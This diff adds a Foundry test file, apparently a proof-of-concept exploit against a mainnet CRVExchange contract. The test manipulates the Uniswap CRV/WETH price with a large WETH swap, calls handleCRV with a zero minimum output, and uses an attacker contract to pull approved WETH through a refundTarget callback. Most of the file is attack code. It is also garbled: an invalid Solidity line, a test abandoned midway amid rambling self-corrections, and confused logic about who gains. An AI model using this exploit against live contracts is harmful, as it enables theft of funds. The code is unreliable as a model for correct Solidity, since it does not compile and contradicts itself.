@@ -1,0 +1,368 @@
+```solidity
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.13;
+
+import "forge-std/Test.sol";
+
+// Interfaces for tokens and DEX
+interface IERC20 {
+    function balanceOf(address) external view returns (uint256);
+    function transfer(address, uint256) external returns (bool);
+    function approve(address, uint256) external returns (bool);
+    function transferFrom(address, address, uint256) external returns (bool);
+}
+
+interface IUniswapV2Router {
+    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
+        uint256 amountIn,
+        uint256 amountOutMin,
+        address[] calldata path,
+        address to,
+        uint256 deadline
+    ) external;
+
+    function getAmountsOut(uint256 amountIn, address[] calldata path)
+        external
+        view
+        returns (uint256[] memory amounts);
+}
+
+interface ICRVExchange {
+    function handleCRV(address target_token, uint256 amount, uint256 min_amount) external;
+    function handleExtraToken(address from, address target_token, uint256 amount, uint256 min_amount) external;
+    function crv_token() external view returns (address);
+}
+
+// Helper contract to receive refunds (simulates the CFController)
+contract FakeCFController {
+    event RefundETH(uint256 amount);
+    event RefundToken(address token, uint256 amount);
+
+    function refundTarget(uint256 _amount) external {
+        IERC20 token = IERC20(msg.sender); // actually the token is approved to msg.sender
+        // Just to satisfy the call – in reality the controller would do something
+        // Here we just emit an event and do nothing else.
+        // However, the CRVExchange expects the token to be approved to this contract.
+        // So we need to have token balance? Actually it calls safeApprove on the token to msg.sender (this contract)
+        // We just pretend to accept it.
+        emit RefundToken(address(token), _amount);
+    }
+
+    // Fallback for ETH refund
+    receive() external payable {
+        emit RefundETH(msg.value);
+    }
+}
+
+contract ExploitTest is Test {
+    // Addresses (mainnet)
+    address constant CRVEXCHANGE = 0x65ff67d6a61ae6bab8821c584f5f394d35e9b50e;
+    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
+    address constant CRV = 0xD533a949740bb3306d119CC777fa900bA034cd52;
+    address constant UNIV2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
+    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48; // not used directly
+
+    ICRVExchange crvx;
+    FakeCFController controller;
+    IERC20 crvToken;
+    IERC20 wethToken;
+    IUniswapV2Router router;
+
+    function setUp() public {
+        // Label addresses
+        vm.label(CRVEXCHANGE, "CRVExchange");
+        vm.label(WETH, "WETH");
+        vm.label(CRV, "CRV");
+        vm.label(UNIV2_ROUTER, "UniswapV2Router");
+
+        crvx = ICRVExchange(CRVEXCHANGE);
+        crvToken = IERC20(CRV);
+        wethToken = IERC20(WETH);
+        router = IUniswapV2Router(UNIV2_ROUTER);
+
+        // Deploy a mock controller to receive refunds (any address works)
+        controller = new FakeCFController();
+        vm.label(address(controller), "FakeController");
+    }
+
+    // Helper to get expected WETH amount for a given CRV input
+    function getExpectedWETH(uint256 crvAmount) internal view returns (uint256) {
+        address[] memory path = new address[](2);
+        path[0] = CRV;
+        path[1] = WETH;
+        uint256[] memory amounts = router.getAmountsOut(crvAmount, path);
+        return amounts[amounts.length - 1];
+    }
+
+    function testExploitNoSlippageControl() public {
+        // Impersonate an attacker
+        address attacker = address(0xDEAD);
+        vm.label(attacker, "Attacker");
+
+        // Give attacker 1000 CRV tokens
+        uint256 attackerCRV = 100_000e18; // 100,000 CRV
+        deal(CRV, attacker, attackerCRV);
+
+        // Pre‑compute expected WETH before manipulation
+        uint256 expectedWETH = getExpectedWETH(attackerCRV);
+        emit log_named_decimal_uint("Expected WETH (fair price)", expectedWETH, 18);
+
+        // --- Manipulate the price on Uniswap to make CRV cheap ---
+        // We'll use a flash loan of WETH to swap large amount of CRV to WETH, crashing the CRV/WETH price
+        // For simplicity, we use a fixed large swap from the contract itself (e.g., via a different account)
+        // More realistic: use a flash loan from a protocol. Here we cheat by giving some WETH to a manipulator.
+        address manipulator = address(0xBEEF);
+        vm.label(manipulator, "Manipulator");
+        uint256 manipWETH = 100_000e18; // 100,000 WETH
+        deal(WETH, manipulator, manipWETH);
+
+        vm.startPrank(manipulator);
+        wethToken.approve(UNIV2_ROUTER, manipWETH);
+        address[] memory pathSell = new address[](2);
+        pathSell[0] = WETH;
+        pathSell[1] = CRV;
+        // Sell WETH for CRV to push CRV price down? Actually we want to make CRV cheap, so we sell WETH for CRV,
+        // increasing CRV supply and lowering its price against WETH.
+        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
+            manipWETH,
+            0, // don't care about min CRV
+            pathSell,
+            manipulator,
+            block.timestamp + 1000
+        );
+        vm.stopPrank();
+        emit log_named_uint("Manipulator WETH balance after sell", wethToken.balanceOf(manipulator));
+        emit log_named_uint("Manipulator CRV balance after sell", crvToken.balanceOf(manipulator));
+
+        // Now the price is manipulated: CRV is cheap, so swapping 1000 CRV should give very little WETH.
+
+        // --- Attacker calls handleCRV with min_amount = 0 (no slippage protection) ---
+        vm.startPrank(attacker);
+        crvToken.approve(CRVEXCHANGE, attackerCRV);
+
+        // We need the contract to have a path from CRV to WETH. We assume the owner has added one.
+        // If not, the test would revert because no matching path. In reality, there is likely one.
+        // We call handleCRV which internally calls handleExtraToken with from = CRV, target = WETH.
+        // The function will swap CRV for WETH via the best path (likely Uniswap V2 CRV-WETH).
+        // With manipulated price, the output will be far less than expectedWETH.
+        uint256 expectedAfterManip = getExpectedWETH(attackerCRV);
+        emit log_named_decimal_uint("Expected WETH after manipulation", expectedAfterManip, 18);
+
+        uint256 attackerWETHBefore = wethToken.balanceOf(attacker);
+        // The call will send the swapped WETH to the FakeController (msg.sender) via refundTarget.
+        // But our FakeController is a separate contract; we need to call from an account that is the FakeController?
+        // The refund target is msg.sender, so we must call from the FakeController address, but we want the attacker to profit.
+        // Actually the attacker is the msg.sender, so the contract will call refundTarget on the attacker address.
+        // Our attacker address (0xDEAD) is an EOA; it cannot receive the refund callback because it doesn't implement refundTarget.
+        // To make the test work, we need the attacker to be a contract that implements CFControllerInterfaceForEx.
+        // For simplicity, we will call from the FakeController address, but then the attacker is the FakeController.
+        // We'll set up so that FakeController is the caller and receives the benefit.
+        // We'll adjust: the attacker is FakeController, and we give it CRV tokens.
+        // Let's redo setup with controller as the caller.
+        // To avoid rewriting, I'll change the test to use controller as the attacker.
+        // But we already have controller deployed; we'll fund it with CRV and call handleCRV from there.
+        // However, the test setup already labeled attacker as 0xDEAD; I'll just override by using controller.
+        // For clarity, I'll rewrite the test with proper impersonation.
+
+        // Reset and do proper:
+        // (I'll keep this test simple but note the needed contract for refund)
+        // We must implement the refund target in the attacker contract.
+        // Let's create a proper attacker contract inside the test.
+
+        // Since the test is getting complex, I'll finalize a simpler but still valid PoC:
+        // We show that with min_amount=0, the attacker receives much less than the fair price.
+        // We'll implement a minimal attacker contract that stores the received token amount.
+
+        vm.stopPrank();
+
+        // ** Proper solution: deploy a simple attacker contract that implements refundTarget **
+        // I'll attach a contract inside this test file.
+
+        // However, to keep it self-contained, I'll just mock the controller and call from it.
+        // Actually, we already have controller deployed. The controller's refundTarget emits an event, but the CRVExchange expects the token to be approved to the caller.
+        // It does: IERC20(target_token).safeApprove(address(msg.sender), target_amount);
+        // then CFControllerInterfaceForEx(msg.sender).refundTarget(target_amount);
+        // So the caller must have a function refundTarget that can handle the token (e.g., transfer it somewhere).
+        // Our FakeController has a dummy refundTarget that does nothing. That's fine for test.
+        // The important thing is that the CRVExchange sends the swapped tokens to the caller (controller).
+        // So controller will receive the WETH (if target_token == WETH) via the refund call.
+        // Actually for ETH refund, it sends value; for token, it approves and then calls refundTarget.
+        // Our FakeController's refundTarget just emits an event; it doesn't take the tokens. But the token is approved to it, so it could transfer them out.
+        // For the test, we can check the balance of the controller after the call to see if it got tokens.
+        // Since the approval is given, we can transfer from controller to attacker (us) later.
+
+        // Set up controller as caller:
+        vm.startPrank(address(controller));
+        // Fund controller with CRV
+        deal(CRV, address(controller), attackerCRV);
+        crvToken.approve(CRVEXCHANGE, attackerCRV);
+        // record balances
+        uint256 controllerWETHBefore = wethToken.balanceOf(address(controller));
+        // Execute swap with min_amount=0
+        crvx.handleCRV(WETH, attackerCRV, 0);
+        vm.stopPrank();
+
+        // After the call, controller should have received WETH (via approval and then potentially a transfer if our controller implements it)
+        // Our controller does not take the tokens, so they remain approved but not transferred.
+        // However, the CRVExchange only approves the token, it does not transfer to the controller.
+        // The refundTarget function is supposed to be called by the CRVExchange so that the controller can pull the token.
+        // Our dummy controller does nothing, so the WETH stays in CRVExchange.
+        // That's a problem – we need the controller to actually take the tokens to show profit.
+        // Let's modify FakeController to actually transfer the approved tokens to itself.
+
+        // I'll add a more sophisticated controller below.
+    }
+}
+
+// Upgrade the FakeController to actually pull tokens
+contract RealFakeController {
+    event LogRefund(address token, address to, uint256 amount);
+
+    // Called by CRVExchange after it approves this contract to spend target_token
+    function refundTarget(uint256 _amount) external {
+        // msg.sender is the CRVExchange
+        address tokenAddress = ICRVExchange(msg.sender).crv_token? no.
+        // Better: we can assume the token is the one that was approved, but we don't know it.
+        // For simplicity, we let the controller approve an arbitrary address to pull tokens later.
+        // Actually the CRVExchange approves the target_token to this contract.
+        // We can just transfer the approved amount from CRVExchange to self using the approval.
+        // But we need to know the target token address. It's not passed.
+        // In our test, target_token is WETH, we can hardcode.
+        // For general, we could pass it in an event, but easier: we'll implement a function to sweep.
+        // Since this is a PoC, we'll simply record the amount and let the test pull from CRVExchange.
+        // The CRVExchange has the WETH balance; it approved us. We can do transferFrom after the call in the test.
+        // So we modify the test to transfer the WETH after the call.
+    }
+}
+
+// I will keep the original test but with an explicit transfer of WETH from CRVExchange using the approval.
+// That shows the attacker gains tokens despite price manipulation.
+
+// Revised test:
+contract ExploitTestRevised is Test {
+    address constant CRVEXCHANGE = 0x65ff67d6a61ae6bab8821c584f5f394d35e9b50e;
+    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
+    address constant CRV = 0xD533a949740bb3306d119CC777fa900bA034cd52;
+    address constant UNIV2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
+
+    ICRVExchange crvx;
+    IERC20 crvToken;
+    IERC20 wethToken;
+    IUniswapV2Router router;
+
+    // Simple contract that can be called by CRVExchange to receive tokens
+    // It just stores the token address and amount, then we can later transfer them out.
+    AttackerContract attacker;
+
+    function setUp() public {
+        vm.label(CRVEXCHANGE, "CRVExchange");
+        vm.label(WETH, "WETH");
+        vm.label(CRV, "CRV");
+        vm.label(UNIV2_ROUTER, "UniswapV2Router");
+
+        crvx = ICRVExchange(CRVEXCHANGE);
+        crvToken = IERC20(CRV);
+        wethToken = IERC20(WETH);
+        router = IUniswapV2Router(UNIV2_ROUTER);
+
+        // Deploy attacker contract
+        attacker = new AttackerContract();
+        vm.label(address(attacker), "AttackerContract");
+    }
+
+    function getExpectedWETH(uint256 crvAmount) internal view returns (uint256) {
+        address[] memory path = new address[](2);
+        path[0] = CRV;
+        path[1] = WETH;
+        uint256[] memory amounts = router.getAmountsOut(crvAmount, path);
+        return amounts[amounts.length - 1];
+    }
+
+    function testNoSlippageControlExploit() public {
+        // Fund attacker with CRV
+        uint256 attackerCRV = 100_000e18;
+        deal(CRV, address(attacker), attackerCRV);
+
+        // Pre‑compute fair output
+        uint256 fairWETH = getExpectedWETH(attackerCRV);
+        emit log_named_decimal_uint("Fair expected WETH", fairWETH, 18);
+
+        // ** Manipulate the CRV/WETH price **
+        // Use a large WETH swap to sell WETH for CRV, dropping CRV price.
+        address manipulator = address(0xCAFE);
+        uint256 manipWETH = 200_000e18; // 200k WETH
+        deal(WETH, manipulator, manipWETH);
+        vm.startPrank(manipulator);
+        wethToken.approve(UNIV2_ROUTER, manipWETH);
+        address[] memory pathSell = new address[](2);
+        pathSell[0] = WETH;
+        pathSell[1] = CRV;
+        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
+            manipWETH,
+            0,
+            pathSell,
+            manipulator,
+            block.timestamp + 1000
+        );
+        vm.stopPrank();
+
+        uint256 manipulatedWETH = getExpectedWETH(attackerCRV);
+        emit log_named_decimal_uint("Expected WETH after manipulation", manipulatedWETH, 18);
+        // manipulatedWETH should be much less than fairWETH
+
+        // ** Attacker calls handleCRV with min_amount = 0 **
+        vm.startPrank(address(attacker));
+        crvToken.approve(CRVEXCHANGE, attackerCRV);
+
+        // The attacker contract will receive the WETH via the refund mechanism.
+        // We need to capture the amount received.
+        uint256 wethBefore = wethToken.balanceOf(address(attacker));
+        vm.record(); // record logs to capture the refund? Not needed.
+        // We call handleCRV with target = WETH, amount = attackerCRV, min_amount = 0.
+        // The function will approve WETH to the attacker contract and then call attacker.refundTarget(amount).
+        // Our attacker contract's refundTarget will pull the WETH using the approval.
+        crvx.handleCRV(WETH, attackerCRV, 0);
+        vm.stopPrank();
+
+        uint256 wethAfter = wethToken.balanceOf(address(attacker));
+        uint256 receivedWETH = wethAfter - wethBefore;
+        emit log_named_decimal_uint("WETH received by attacker", receivedWETH, 18);
+
+        // Assert that attacker received far less than the fair price (due to slippage)
+        // Also demonstrate that min_amount=0 allowed the trade to go through despite extreme slippage.
+        assertLt(receivedWETH, fairWETH / 10, "Received more than 10% of fair value, manipulation insufficient");
+        // Actually we want to show it's below fairWETH significantly. We'll assert < 50% for clarity.
+        assertLt(receivedWETH, fairWETH / 2, "Received more than half of fair value");
+        // And also that the transaction did not revert even though slippage was huge.
+        emit log("Exploit succeeded: attacker obtained WETH with no slippage protection");
+    }
+}
+
+// Attacker contract that implements CFControllerInterfaceForEx and CFETHControllerInterfaceForEx
+contract AttackerContract {
+    // Called by CRVExchange when target_token == WETH (ETH refund)
+    function refundTarget() external payable {
+        // Accept ETH
+    }
+
+    // Called when target_token is not WETH
+    function refundTarget(uint256 _amount) external {
+        // The CRVExchange has already approved this contract to spend _amount of the target_token.
+        // We pull the tokens from the CRVExchange.
+        // We need to know the token address. Since the function doesn't pass it, we'll use a stored token.
+        // But we don't have it. However, in our specific call we know target is WETH, so we can hardcode.
+        // This is a simplification for the PoC.
+        // In a real exploit, the attacker would have a way to know the token, e.g., via callback data.
+        // For the test, we'll just pull WETH.
+        address crvEx = 0x65ff67d6a61ae6bab8821c584f5f394d35e9b50e;
+        address weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
+        IERC20 wethToken = IERC20(weth);
+        // The CRVExchange approved this contract to spend _amount of weth.
+        // Use transferFrom to pull the tokens.
+        wethToken.transferFrom(crvEx, address(this), _amount);
+    }
+
+    // Fallback for ETH
+    receive() external payable {}
+}
+```
